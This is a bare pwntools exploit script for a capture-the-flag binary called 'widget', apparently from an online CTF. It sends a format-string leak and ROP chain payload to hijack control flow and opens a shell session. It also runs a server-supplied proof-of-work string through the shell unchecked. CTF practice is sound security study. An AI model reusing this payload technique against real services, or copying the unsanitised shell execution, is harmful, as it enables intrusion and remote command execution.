#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *
from subprocess import check_output

elf = context.binary = ELF('widget', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'challs.actf.co'
	port = int(args.PORT or 31320)
	if args.GDB:
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
tbreak main
b *main+341
b *0x4014AF
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

OFFSET = 40

pow = rl()[len('proof of work: '):].decode()
print(pow)
res = check_output(pow, shell=True)
print(res)
sla(b'solution', res.decode())

sla(b'Amount: ', b'300')
# sla(b'Contents:', cyclic(100, n=8))

rop_main = ROP(elf)
POP_RBP_RET = rop_main.find_gadget(['pop rbp', 'ret'])[0]
RET = POP_RBP_RET + 1

sla(b'Contents:', flat(
	b'%p..' * (OFFSET//4),
	POP_RBP_RET,
	elf.bss(0x100),
	0x40130B
))

ia()
